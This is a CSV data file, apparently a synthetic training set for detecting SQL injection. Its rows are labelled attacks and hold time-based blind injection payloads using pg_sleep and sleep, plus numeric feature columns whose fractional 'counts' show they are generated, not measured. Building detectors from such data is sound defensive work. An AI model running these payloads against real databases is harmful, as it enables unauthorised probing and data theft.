id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000246,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.527892566028963,75.77594757080078,21.696569442749023,9.293460845947266,33.83389663696289,0.011500191874802113,23.11343765258789,11.048090934753418,1.0477031469345093,0.2755577862262726,0.13458870351314545,0.42646607756614685,0.1326458752155304,3.370342254638672,1.3066215515136719,0.6731995940208435,0.6229170560836792,0.16716042160987854,-0.06364844739437103,0.08611203730106354,2.460707902908325,2.8122482299804688,0.3989029824733734,0.2665719985961914,0.9761530756950378,0.0067953248508274555,0.0014297411544248462,0.24032697081565857,0.07966524362564087,0.16418835520744324,0.16651372611522675,0.1860658824443817,0.27047085762023926,-0.027819586917757988,0.5392528176307678,0.9179606437683105,1.9054371118545532,0.38361233472824097,0.6205410361289978,0.027679622173309326,0.24971362948417664,0.3716067373752594,0.5545542240142822,0.23396287858486176,0.15521784126758575,0.08123534917831421,0.05524115264415741,-0.059034571051597595,-0.14260435104370117,-0.15332463383674622,-0.4120967984199524,0.10885334014892578,-0.0180305615067482,-0.12884271144866943,-0.04616440832614899,0.06722439080476761,-0.025976121425628662,0.09495469927787781,0.053821541368961334,-0.02088150382041931,-0.01688898354768753,0.2759619355201721,0.05462329089641571,-0.10080923140048981,0.23919375240802765,0.008578300476074219,-0.11976301670074463,-0.1463879942893982,0.005663508083671331,-0.11391431093215942,-0.05407384783029556,-0.22908227145671844,-0.30504393577575684,-0.005802959203720093,0.04272748902440071,0.19472689926624298,0.8695471286773682,0.34197351336479187,0.02244616486132145,-0.0073966942727565765,-0.11853235960006714,3.5436336994171143,0.7511191368103027,0.11529113352298737,0.6244183778762817,0.14244909584522247,-0.13329651951789856,0.19819334149360657,-0.07618752121925354
GAN_000247,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.619088842570085,75.91960906982422,20.323087692260742,10.170266151428223,31.335742950439453,-0.01419974584132433,24.59722900390625,10.855050086975098,0.9279273748397827,0.28246575593948364,0.14901533722877502,0.4285888671875,0.13198626041412354,3.44623064994812,1.2314155101776123,0.4629434049129486,0.36282557249069214,0.19897401332855225,-0.07973621040582657,-0.01296243630349636,2.638815402984619,2.9439139366149902,0.23560522496700287,0.15635719895362854,1.0154328346252441,0.00582633214071393,-0.005754485260695219,0.22035333514213562,0.05512216314673424,0.11830398440361023,0.2665131092071533,-0.015751391649246216,0.24763233959674835,-0.1759602129459381,0.5013917684555054,1.0466375350952148,1.995057225227356,0.7267102003097534,0.6544151902198792,0.15389837324619293,0.24793899059295654,0.290068656206131,0.4971970319747925,0.2354896366596222,0.1878635585308075,0.09295573830604553,0.09195886552333832,-0.05037948489189148,-0.10037312656641006,0.0880708247423172,-0.20816659927368164,-0.022577743977308273,-0.08993703126907349,-0.08654636144638062,0.002039009239524603,0.017078615725040436,-0.0818389356136322,0.1477145403623581,-0.03934971243143082,0.35478654503822327,-0.008219815790653229,0.1428235024213791,0.019369930028915405,0.06691485643386841,0.3845168352127075,0.13122040033340454,-0.19421055912971497,0.06686967611312866,-0.20930466055870056,-0.14214637875556946,0.08862674236297607,-0.001538572832942009,0.024525819346308708,-0.08638976514339447,-0.044110994786024094,0.027292268350720406,0.7595844864845276,0.43687018752098083,0.017277570441365242,0.06632429361343384,0.018774010241031647,3.495694637298584,0.7879341840744019,0.1560947746038437,0.9955522418022156,0.25413966178894043,-0.09728886932134628,0.028959110379219055,0.05342470854520798
GAN_000248,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.737194324358007,74.90813446044922,20.605154037475586,9.2949800491333,30.967565536499023,-0.03420384228229523,25.179475784301758,11.540584564208984,0.797022819519043,0.24684658646583557,0.15061935782432556,0.431924045085907,0.12936842441558838,3.414747476577759,1.457951545715332,0.6152315139770508,0.42718154191970825,0.22255145013332367,0.042061466723680496,0.013506067916750908,2.439526319503784,3.1175377368927,0.2560349702835083,0.13540050387382507,0.8814518451690674,0.010890002362430096,-0.013605883345007896,0.14078733325004578,0.07153930515050888,0.17088565230369568,0.302958607673645,0.09292933344841003,0.2702677845954895,-0.025045299902558327,0.5663151144981384,0.9136092066764832,1.995024561882019,0.4499802589416504,0.5615485310554504,0.07800357043743134,0.2013186663389206,0.32736217975616455,0.4841621518135071,0.23516061902046204,0.16009174287319183,0.09228202700614929,0.1614738404750824,-0.1567557156085968,-0.08385608345270157,0.06831720471382141,-0.49068379402160645,-0.04068261757493019,0.2106384038925171,-0.15609988570213318,-0.25162607431411743,0.01806212216615677,-0.049946919083595276,0.34399235248565674,-0.08086757361888885,0.17711396515369415,0.026551619172096252,0.15089230239391327,-0.00012163817882537842,0.0842934101819992,0.3558945655822754,-0.002004168927669525,-0.15808483958244324,-0.05466526001691818,-0.16335970163345337,-0.16165296733379364,-0.08188364654779434,-0.11295697093009949,-0.16880565881729126,0.1405462622642517,-0.05828985571861267,0.027502184733748436,1.035245656967163,0.3477158844470978,0.012827115133404732,0.027524784207344055,0.12198124825954437,3.44806170463562,0.8452867269515991,0.12213433533906937,0.7186976671218872,0.36461904644966125,0.14777517318725586,0.19625115394592285,0.03674546629190445
GAN_000249,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,nearest_attack_euclidean,R000143,4.625400693899295,76.79093933105469,21.552183151245117,9.848381042480469,31.461366653442383,-0.011369827203452587,22.65300750732422,10.791330337524414,1.0462920665740967,0.26653367280960083,0.1443411111831665,0.43819117546081543,0.13300535082817078,3.390371084213257,1.321162462234497,0.720042884349823,0.6122491955757141,0.23826250433921814,0.25413379073143005,-0.018680129200220108,2.4869256019592285,2.907531976699829,0.30523696541786194,0.09906807541847229,0.9417678713798523,0.014673816971480846,0.003642538795247674,0.16983656585216522,0.14207953214645386,0.20686505734920502,0.2739295959472656,0.006895542144775391,0.24868302047252655,-0.0217688400298357,0.4894448518753052,0.963336169719696,2.0425758361816406,0.5759714245796204,0.6201958656311035,-0.020557910203933716,0.20039930939674377,0.27819448709487915,0.5155003070831299,0.2567647695541382,0.08211243152618408,0.04723002761602402,0.09716331213712692,0.026055958122015,-0.063352569937706,-0.05094948038458824,-0.31139808893203735,-0.033762261271476746,-0.0004057064652442932,0.06183839589357376,-0.18615780770778656,0.08722786605358124,0.0892753005027771,0.22637508809566498,-0.06700129061937332,0.005239933729171753,-0.09295475482940674,0.023325003683567047,-0.06751364469528198,0.030298862606287003,0.22421357035636902,-0.12598830461502075,-0.13153818249702454,-0.04729144275188446,-0.0025130007416009903,0.062154874205589294,0.07469421625137329,-0.11479014158248901,-0.1718894988298416,0.0828758031129837,0.23649746179580688,0.050416961312294006,0.9019874930381775,0.34354326128959656,0.01664889231324196,0.0405021496117115,0.0812487006187439,3.4926939010620117,0.7635086178779602,0.07215680181980133,0.8980405330657959,0.3652065396308899,0.13360437750816345,0.10790220648050308,-0.0594087690114975
GAN_000250,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.510742317752086,75.15274810791016,21.42068862915039,10.136751174926758,30.344928741455078,-0.011723793111741543,22.837923049926758,10.91996955871582,0.9852957129478455,0.27829664945602417,0.14176282286643982,0.42299091815948486,0.13618959486484528,3.43975830078125,1.4761396646499634,0.4788006842136383,0.41049718856811523,0.16901060938835144,-0.0044269985519349575,0.05948100984096527,2.684438943862915,2.7801687717437744,0.373513787984848,0.04506402835249901,0.9865506291389465,0.010247495956718922,0.003953952342271805,0.2608155608177185,0.029682938009500504,0.2259180247783661,0.14209219813346863,-0.05398697778582573,0.24036163091659546,-0.030883828178048134,0.4916084408760071,1.1050117015838623,2.0309276580810547,0.49232399463653564,0.7028339505195618,-0.09708160161972046,0.3181731104850769,0.34584736824035645,0.587120532989502,0.1839318871498108,0.18051989376544952,0.12074411660432816,0.06672792881727219,0.04778324067592621,-0.07564415782690048,0.035985302180051804,-0.2550617456436157,0.08594316244125366,-0.08083097636699677,-0.02450401708483696,0.11584670096635818,0.010728023946285248,-0.043365806341171265,0.05461364984512329,-0.06843620538711548,0.324246346950531,0.02954418957233429,0.20913255214691162,-0.09715908765792847,0.13778792321681976,0.21348319947719574,0.049933504313230515,-0.2415124773979187,-0.08783769607543945,-0.0061144158244132996,-0.15301163494586945,0.004602834582328796,-0.14913055300712585,0.012445066124200821,0.014005199074745178,0.05917581915855408,0.03010750003159046,0.8033838272094727,0.3145648241043091,0.0044166347943246365,0.01918288692831993,0.04974422976374626,3.662200689315796,0.7952760457992554,0.19106000661849976,0.9698192477226257,0.2387346625328064,-0.16728761792182922,0.15375131368637085,0.11829333752393723
GAN_000251,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.4807450867002325,76.67799377441406,21.6364803314209,10.19200611114502,32.78953552246094,-0.010224665515124798,22.88518714904785,10.773200035095215,0.9301933646202087,0.2867473363876343,0.13438060879707336,0.42578989267349243,0.13420291244983673,3.404409885406494,1.3307503461837769,0.5456000566482544,0.5330719351768494,0.15275606513023376,0.0037944046780467033,-0.00180087611079216,2.6029891967773438,2.9146616458892822,0.38766637444496155,0.20723123848438263,1.027009129524231,0.003482343163341284,0.00015861997962929308,0.17919737100601196,0.03772701323032379,0.16561296582221985,0.11254052817821503,0.035936251282691956,0.23926950991153717,-0.12459184974431992,0.5522662997245789,1.0252079963684082,2.0372822284698486,0.6894960403442383,0.7333180904388428,-0.01851823180913925,0.2519645094871521,0.3233690559864044,0.4911825954914093,0.20958054065704346,0.16222020983695984,0.08555196225643158,0.05255058780312538,-0.14319224655628204,-0.15093478560447693,-0.00145757757127285,-0.269214391708374,0.05863233283162117,-0.05893225967884064,-0.02818087860941887,0.0011122808791697025,-0.0622112974524498,-0.023861289024353027,0.031712695956230164,0.0800919309258461,0.23095184564590454,0.03581938147544861,0.11922949552536011,0.02417571097612381,-0.016321521252393723,0.21886979043483734,0.1034107655286789,-0.10300467908382416,-0.032989904284477234,-0.11992305517196655,0.025719285011291504,0.03953396901488304,-0.05479690432548523,-0.06035328283905983,-0.06262871623039246,0.0789220854640007,0.05583978071808815,0.8386178612709045,0.4506855010986328,0.018287239596247673,0.014056604355573654,0.024227716028690338,3.5817840099334717,0.8181648254394531,0.16122548282146454,0.9675965309143066,0.19995543360710144,-0.11923599243164062,0.11661385744810104,0.07157691568136215
GAN_000252,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.52396248482171,76.29120635986328,21.70872688293457,9.752204895019531,32.66276931762695,0.0174588430672884,23.11849594116211,10.70593547821045,0.9351289868354797,0.2961594760417938,0.13618136942386627,0.43072259426116943,0.13326126337051392,3.4542267322540283,1.178023099899292,0.6070947647094727,0.44654881954193115,0.16440117359161377,0.07909073680639267,0.008189190179109573,2.653602361679077,2.8685364723205566,0.33284708857536316,0.28892362117767334,1.0568138360977173,0.008901769295334816,0.00904060248285532,0.20320618152618408,0.06958930194377899,0.17641891539096832,0.1390482783317566,0.0448555052280426,0.22662334144115448,-0.12891355156898499,0.5131394267082214,1.0028643608093262,1.9531188011169434,0.6499828696250916,0.7064223885536194,0.0038813799619674683,0.2981976866722107,0.34038403630256653,0.5110417008399963,0.24851474165916443,0.1450991928577423,0.07781753689050674,0.04219663888216019,0.003908190876245499,-0.09538063406944275,0.060518283396959305,-0.08534212410449982,0.009326979517936707,-0.11122205853462219,0.031818121671676636,0.09266066551208496,-0.05880720168352127,-0.18177297711372375,-0.06422534584999084,0.170827716588974,0.13613361120224,0.046220630407333374,0.13328537344932556,0.060080382972955704,-0.055525779724121094,0.1876709759235382,-0.005158759653568268,-0.25890007615089417,-0.014012396335601807,-0.04478555917739868,-0.0352572500705719,0.02846895158290863,0.018465593457221985,-0.021391358226537704,-0.0496063232421875,0.06978227943181992,0.009741734713315964,0.7815340757369995,0.3984094560146332,0.019651643931865692,0.013517051935195923,-0.000418640673160553,3.532529592514038,0.7514698505401611,0.05710362643003464,1.0030840635299683,0.19607064127922058,-0.1356031596660614,0.10751200467348099,0.11932031065225601
GAN_000253,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,nearest_attack_euclidean,R000143,4.860650426810478,76.49071502685547,20.17861557006836,10.936334609985352,32.106590270996094,-0.04187792167067528,23.9495849609375,10.953478813171387,0.963352382183075,0.27207767963409424,0.15173514187335968,0.44547757506370544,0.12893950939178467,3.365442991256714,1.2645814418792725,0.9107604622840881,0.6311492323875427,0.31831586360931396,0.09500979632139206,-0.054590776562690735,2.812727928161621,3.0126328468322754,0.2446662038564682,0.084164097905159,0.9925792813301086,0.03177623450756073,0.005965652875602245,0.21999166905879974,0.15326738357543945,0.18742801249027252,0.2518633008003235,-0.028040289878845215,0.32289963960647583,-0.21479332447052002,0.4572664797306061,1.1464225053787231,2.130715847015381,0.7437897324562073,0.7213059663772583,-0.019434262067079544,0.26354485750198364,0.23787280917167664,0.5675634145736694,0.2805207073688507,0.19479084014892578,0.024086304008960724,0.1354609876871109,-0.02100546285510063,0.06107838451862335,0.1921253353357315,-0.2217324674129486,-0.08364406228065491,0.0693507194519043,0.009101197123527527,-0.26138728857040405,0.20741361379623413,0.148649200797081,0.3190014362335205,-0.25164127349853516,0.15588560700416565,0.11585220694541931,0.07808281481266022,-0.10093942284584045,0.13344846665859222,0.41466212272644043,-0.03746134787797928,0.011658526957035065,-0.12389467656612396,-0.16019336879253387,0.04676319286227226,0.10759283602237701,-0.1341862678527832,-0.168308824300766,-0.07603763043880463,0.2382204532623291,0.08615080267190933,0.850675642490387,0.4445120394229889,0.01338347140699625,0.09717816859483719,-0.01931159943342209,3.546314001083374,0.7234012484550476,0.08618631213903427,0.9342784881591797,0.37049275636672974,0.008159942924976349,-0.11439186334609985,0.1123625710606575
GAN_000254,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.520507949079547,74.62776184082031,20.768756866455078,9.398109436035156,31.391647338867188,0.022014690563082695,23.014667510986328,10.688332557678223,0.9143879413604736,0.2816525995731354,0.1423981487751007,0.4322812855243683,0.13049474358558655,3.371490955352783,0.9404872059822083,0.4433688521385193,0.49227678775787354,0.21185219287872314,0.08757023513317108,-0.06279376894235611,2.6044528484344482,2.861035108566284,0.2388131320476532,0.2821286618709564,0.9894555807113647,0.021040989086031914,0.003041713498532772,0.32284796237945557,0.12592056393623352,0.13070017099380493,0.2024911344051361,0.04538865387439728,0.2285686880350113,-0.14848871529102325,0.4717060625553131,1.0987449884414673,2.0145928859710693,0.6783783435821533,0.635079026222229,-0.07606183737516403,0.2867847681045532,0.34757882356643677,0.5134506821632385,0.21080853044986725,0.17698271572589874,0.029228299856185913,0.07502611726522446,0.007654543966054916,-0.15462574362754822,-0.0013207439333200455,-0.09990470111370087,-0.08026561141014099,-0.1466682404279709,0.1316199004650116,0.1490362137556076,0.0635894164443016,-0.21485161781311035,0.1252966821193695,-0.08729018270969391,0.1379884034395218,0.07045462727546692,0.13616546988487244,-0.1039162278175354,0.1045912355184555,0.51056307554245,0.19319459795951843,-0.12150806188583374,-0.0667511373758316,-0.09414494037628174,-0.09960439801216125,0.1218215823173523,-0.23996011912822723,-0.13398168981075287,-0.21376405656337738,0.06416004151105881,0.14256173372268677,0.8045207858085632,0.336370587348938,0.01979016698896885,0.052594780921936035,0.003072395920753479,3.5114097595214844,0.7629833221435547,0.1248537227511406,0.859481930732727,0.22023600339889526,-0.13058289885520935,-0.06820275634527206,-0.025082550942897797
GAN_000255,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.537441951037464,75.38092041015625,21.291311264038086,9.438165664672852,31.24887466430664,0.0068923975341022015,23.562889099121094,10.800457000732422,0.8910828828811646,0.2772323191165924,0.14103035628795624,0.4271320402622223,0.1321742683649063,3.443434715270996,1.1051249504089355,0.5388258695602417,0.4940202236175537,0.19203877449035645,0.1281122863292694,-0.07315772771835327,2.6121015548706055,2.91499662399292,0.26282548904418945,0.19126375019550323,0.9622740745544434,0.019050361588597298,0.00746364938095212,0.2338537871837616,0.12390485405921936,0.1937437802553177,0.21458232402801514,-0.09807329624891281,0.25287070870399475,-0.10377784818410873,0.4917755126953125,1.0333834886550903,2.041670322418213,0.6173866987228394,0.6247013211250305,-0.06063638627529144,0.2961798906326294,0.31924107670783997,0.5714980363845825,0.23880645632743835,0.18357795476913452,0.05881241336464882,0.10222901403903961,-0.04023396968841553,-0.03488003462553024,0.09221300482749939,-0.13690415024757385,-0.08577004820108414,0.07337123900651932,-0.00986967608332634,-0.007309341803193092,0.07050074636936188,-0.09043677151203156,0.022753525525331497,-0.10694095492362976,0.1981823593378067,-0.0032722949981689453,0.016022488474845886,0.017494529485702515,0.038481976836919785,0.2941891551017761,0.0738818496465683,-0.23220887780189514,-0.03858952969312668,-0.07986835390329361,-0.07402022182941437,0.0124279223382473,-0.10337785631418228,-0.07999926805496216,-0.07640594244003296,0.006104242987930775,0.021325569599866867,0.8120244145393372,0.3433520495891571,0.015957791358232498,0.0680025964975357,0.07120586931705475,3.538856267929077,0.787475049495697,0.061734557151794434,0.9512155652046204,0.3530701994895935,0.04139699786901474,0.07638316601514816,0.11353465169668198
GAN_000256,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,nearest_attack_euclidean,R000143,4.575775978109872,76.69696044921875,21.969314575195312,10.326573371887207,32.38174057006836,-0.02009422704577446,22.12847328186035,10.783599853515625,0.9653975367546082,0.2790241837501526,0.14489960670471191,0.42644837498664856,0.13617856800556183,3.441682815551758,1.5610235929489136,0.5195572376251221,0.585719645023346,0.19733665883541107,0.20265313982963562,0.14036008715629578,2.563511848449707,2.895491123199463,0.4405098855495453,0.03746822476387024,0.9403790831565857,0.004538373555988073,-0.0008033346966840327,0.16636022925376892,0.07085004448890686,0.21361327171325684,0.0867418572306633,-0.1345246285200119,0.26155585050582886,0.046264395117759705,0.5199987292289734,0.9801514148712158,2.0006628036499023,0.6873928904533386,0.6896224617958069,0.01583629846572876,0.24523524940013885,0.3000345230102539,0.5502526164054871,0.1981065720319748,0.1104474738240242,0.10598939657211304,0.08264663815498352,0.004097606986761093,0.018082156777381897,0.02093777433037758,-0.28451302647590637,0.035880111157894135,0.05362527817487717,-0.1470051407814026,-0.10205341130495071,0.04777694493532181,0.08786013722419739,0.09042885154485703,-0.08667979389429092,0.1985480785369873,-0.11550818383693695,-0.01554746925830841,-0.010346323251724243,0.0738796591758728,0.09988415241241455,-0.023080892860889435,-0.23836202919483185,-0.09938806295394897,0.019532285630702972,0.08080093562602997,0.06906893104314804,-0.08635123819112778,0.03319644555449486,-0.0010615959763526917,0.0754086822271347,-0.022425610572099686,0.8698611259460449,0.3771575689315796,0.01020395290106535,0.034382227808237076,0.026174623519182205,3.526859998703003,0.8031941056251526,0.11983825266361237,0.9508128762245178,0.3056142032146454,0.03623688220977783,0.13865819573402405,0.02530129998922348
GAN_000257,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.620678485596382,74.99110412597656,21.47206687927246,9.160758018493652,31.28947639465332,-0.02916010469198227,23.45664405822754,11.186083793640137,0.8914901614189148,0.2759197950363159,0.14055322110652924,0.4283455014228821,0.13324333727359772,3.474699020385742,1.4225893020629883,0.6485078930854797,0.4344838857650757,0.14826640486717224,0.25862210988998413,0.05026380717754364,2.679821014404297,2.9129202365875244,0.3869520127773285,0.08491912484169006,0.937621533870697,0.0024757017381489277,5.63877729291562e-05,0.13813242316246033,0.04380294308066368,0.22990910708904266,0.1912955641746521,-0.016898207366466522,0.22815696895122528,-0.11511171609163284,0.5676323175430298,0.9966999888420105,2.032003164291382,0.4876337945461273,0.6941776275634766,0.031943611800670624,0.2762618958950043,0.3200744390487671,0.5151106715202332,0.20407220721244812,0.11685896664857864,0.12160836160182953,0.09907873719930649,-0.02619784139096737,0.025353170931339264,0.13520501554012299,-0.4333394169807434,-0.05173927918076515,0.031595971435308456,-0.10816951096057892,-0.0389416478574276,-0.1198040321469307,-0.09799247980117798,0.05998587608337402,-0.0044288188219070435,0.3551344871520996,0.058437734842300415,0.16869165003299713,-0.07023800909519196,0.03810973837971687,0.18442586064338684,-0.026752877980470657,-0.24736998975276947,-0.0378655344247818,-0.08574343472719193,-0.0666794627904892,0.032095201313495636,-0.012757701799273491,0.09483550488948822,0.04134085029363632,0.10639700293540955,-0.10491679608821869,0.9265584349632263,0.3672697842121124,0.01246052049100399,0.01671355962753296,-0.03771539032459259,3.499117851257324,0.8256864547729492,0.06409052014350891,0.9869186878204346,0.36637192964553833,0.0625651404261589,0.2418367564678192,0.0513029471039772
GAN_000258,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.409617808016887,75.82367706298828,21.602455139160156,9.12335205078125,30.88003921508789,-0.0018516333075240254,22.30440330505371,10.845833778381348,0.9611603021621704,0.276305615901947,0.13966913521289825,0.43210771679878235,0.13240087032318115,3.377058982849121,1.1681759357452393,0.47814786434173584,0.49756181240081787,0.15487445890903473,0.12957832217216492,-0.09836550801992416,2.5617380142211914,2.730140447616577,0.27161338925361633,0.20905059576034546,0.9532191157341003,0.009761408902704716,0.00014719637692905962,0.20940358936786652,0.09933945536613464,0.14290884137153625,0.11815254390239716,0.02826043963432312,0.23590147495269775,-0.07840342074632645,0.4760971665382385,0.9785963892936707,1.982195496559143,0.7478837966918945,0.7068644762039185,0.003224208950996399,0.2383834719657898,0.2919600307941437,0.5680682063102722,0.214290589094162,0.13232611119747162,0.04547645524144173,0.07986830919981003,0.017458956688642502,-0.1574610471725464,-0.09335839748382568,-0.1950078159570694,-0.11577343940734863,-0.14692489802837372,0.014582552015781403,0.046627119183540344,-0.03309702128171921,-0.06013528257608414,0.08689562231302261,-0.08856731653213501,0.3231688141822815,-0.05981037765741348,-0.04899640381336212,-0.04379718005657196,0.0668259859085083,0.4861966371536255,0.09978622198104858,-0.1046859472990036,-0.17154116928577423,-0.08332236856222153,-0.07683257758617401,0.14319747686386108,-0.22415556013584137,-0.0334380604326725,-0.14838768541812897,0.1218431368470192,0.11485650390386581,0.8357512950897217,0.3798021674156189,0.01472401525825262,0.05433696508407593,0.07914645969867706,3.4203193187713623,0.7745944261550903,0.13996568322181702,0.99181067943573,0.3545999228954315,0.02541622892022133,-0.20000100135803223,6.604939699172974e-05
GAN_000259,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,4.741135554396277,75.47160339355469,20.513139724731445,10.953572273254395,31.967472076416016,-0.017765449360013008,23.55251121520996,11.11620044708252,0.9674596190452576,0.2749824821949005,0.14881053566932678,0.42685723304748535,0.13499130308628082,3.425119638442993,1.4910833835601807,0.39863237738609314,0.5154361128807068,0.2787400186061859,0.15170714259147644,0.15046508610248566,2.6300454139709473,2.987070322036743,0.40368106961250305,0.11566731333732605,0.9209797382354736,0.022284436970949173,-0.0066910297609865665,0.2098396271467209,0.09611998498439789,0.23804856836795807,0.16196052730083466,-0.1989154815673828,0.29752665758132935,-0.0037790071219205856,0.44373467564582825,1.134330153465271,2.0984013080596924,0.5676342248916626,0.6291167140007019,-0.055770114064216614,0.2830200791358948,0.3004559278488159,0.6171440482139587,0.1962973177433014,0.18669453263282776,0.10159424692392349,0.10745290666818619,0.005675088614225388,0.08356444537639618,0.09076200425624847,-0.34228360652923584,-0.12122152745723724,0.07909461855888367,-0.18208011984825134,-0.09189300984144211,0.10307122766971588,0.07683825492858887,0.18765196204185486,-0.23844704031944275,0.20245516300201416,0.061049312353134155,0.033576250076293945,0.018842339515686035,0.10011760890483856,0.16934531927108765,0.06812046468257904,-0.3520939350128174,-0.15987448394298553,-0.041079044342041016,-0.03666192293167114,-0.12701520323753357,-0.1111079603433609,-0.14628684520721436,-0.0061232298612594604,0.04074792563915253,0.013336140662431717,0.9478732943534851,0.32946276664733887,0.011547625064849854,0.06698205322027206,-0.047089412808418274,3.681931972503662,0.7787484526634216,0.15496103465557098,0.8122764229774475,0.279769629240036,-0.08891740441322327,0.2242937684059143,0.13150441646575928
GAN_000260,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,4.628349186950171,77.24064636230469,21.427139282226562,9.715799331665039,31.69745445251465,-0.01977280154824257,22.92098617553711,10.963227272033691,0.9733365178108215,0.2810497283935547,0.1479056030511856,0.43508270382881165,0.13220645487308502,3.4214091300964355,1.3004240989685059,0.7646051049232483,0.5781898498535156,0.2179340422153473,0.16531908512115479,0.1203252300620079,2.5912110805511475,2.769212007522583,0.34266719222068787,0.22278247773647308,0.9852203130722046,0.013416292145848274,0.0036922204308211803,0.11826732009649277,0.1588934361934662,0.1645887941122055,0.19458764791488647,-0.02699419856071472,0.3028005063533783,-0.04001609981060028,0.47517988085746765,0.9089288115501404,1.9460641145706177,0.7204937934875488,0.7300509810447693,0.09117712080478668,0.20954467356204987,0.2548338770866394,0.5651450753211975,0.3055727183818817,0.11606249213218689,0.02585666999220848,0.10346581786870956,0.05621222406625748,0.042715080082416534,0.021394096314907074,-0.18848060071468353,-0.13970232009887695,-0.04757131636142731,-0.11807473003864288,-0.28706467151641846,0.0897422507405281,0.10455705225467682,0.2212156504392624,-0.09383177012205124,0.11607629060745239,-0.12854838371276855,-0.05443694815039635,-0.031465619802474976,0.022520270198583603,0.24323469400405884,-0.10804617404937744,-0.18195274472236633,-0.08337843418121338,-0.012927798554301262,0.1097869798541069,0.08454330265522003,-0.15717482566833496,-0.06976157426834106,-0.018214717507362366,0.18774336576461792,0.05289461463689804,0.8432475924491882,0.3665246367454529,0.017271144315600395,0.0930745005607605,0.07666340470314026,3.4016644954681396,0.7401478290557861,0.06527911871671677,0.9479861259460449,0.40481486916542053,0.1170070692896843,-0.1301516741514206,-0.020407482981681824
